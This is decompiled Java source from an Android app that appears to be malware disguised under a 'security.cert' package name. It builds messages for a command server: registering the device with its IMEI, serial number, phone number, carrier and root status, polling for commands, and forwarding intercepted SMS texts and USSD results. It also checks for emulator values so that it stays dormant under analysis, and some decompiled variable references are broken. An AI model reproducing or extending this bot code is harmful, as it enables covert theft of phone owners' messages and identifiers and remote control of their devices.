package com.security.cert.a.a;

import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import android.util.Log;
import com.security.cert.b.a.a;
import com.security.cert.b.b;
import com.security.cert.b.b.a.d;
import java.util.Locale;
import org.json.JSONException;
import org.json.JSONObject;

public class c {
    public static void a(Context context) {
        JSONObject jSONObject = new JSONObject();
        try {
            Object a = b.a(context);
            Object b = b.b(context);
            Object c = b.c(context);
            String d = b.d(context);
            if (c == null) {
                c = "";
            }
            if (a == null) {
                a = "";
            }
            if (b == null) {
                b = "";
            }
            jSONObject.put("action", "register");
            jSONObject.put("device_model", Build.MODEL);
            jSONObject.put("device_serial_number", a);
            jSONObject.put("device_imei", b);
            jSONObject.put("carrier", d);
            jSONObject.put("os_version", VERSION.RELEASE);
            jSONObject.put("phone_number", c);
            jSONObject.put("default_delay", 60);
            jSONObject.put("rooted", b.a() ? "true" : "false");
            jSONObject.put("language", Locale.getDefault().getLanguage());
            jSONObject.put("app_version", "2.1");
        } catch (JSONException e) {
            Log.e("ServerApi", e.toString());
        }
        String b2 = b.b(context);
        String c2 = b.c(context);
        String d2 = b.d(context);
        if (c2 == null) {
            c2 = "";
        }
        if (b2 == null) {
            b2 = "";
        }
        if (d2 == null) {
            d2 = "";
        }
        if (d2.toLowerCase().equals("android") || r1.equals("000000000000000") || r1.equals("012345678912345") || r2.equals("15555215554") || Build.MODEL.toLowerCase().equals("sdk") || Build.MODEL.toLowerCase().equals("generic")) {
            a.a(context, true);
        } else {
            a.a(context, jSONObject, new d());
        }
    }

    public static void a(Context context, com.security.cert.b.b.a.b bVar) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("action", "check_commands");
            jSONObject.put("user_id", a.b(context));
        } catch (JSONException e) {
            Log.e("ServerApi", e.toString());
        }
        a.a(context, jSONObject, bVar);
    }

    public static void a(Context context, String str, String str2) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("action", "submit_sms");
            jSONObject.put("user_id", a.b(context));
            jSONObject.put("sender_phone_number", str);
            jSONObject.put("sms_text", str2);
        } catch (JSONException e) {
            Log.e("ServerApi", e.toString());
        }
        a.a(context, jSONObject, new d());
    }

    public static void a(Context context, JSONObject jSONObject) {
        a.a(context, jSONObject, new com.security.cert.b.b.a.c(context, jSONObject));
    }

    public static void b(Context context) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("action", "pong");
            jSONObject.put("user_id", a.b(context));
        } catch (JSONException e) {
            Log.e("ServerApi", e.toString());
        }
        d.a(jSONObject);
    }

    public static void b(Context context, String str, String str2) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("action", "submit_ussd");
            jSONObject.put("user_id", a.b(context));
            jSONObject.put("query", str);
            jSONObject.put("result", str2);
        } catch (JSONException e) {
            Log.e("ServerApi", e.toString());
        }
        a.a(context, jSONObject, new d());
    }
}
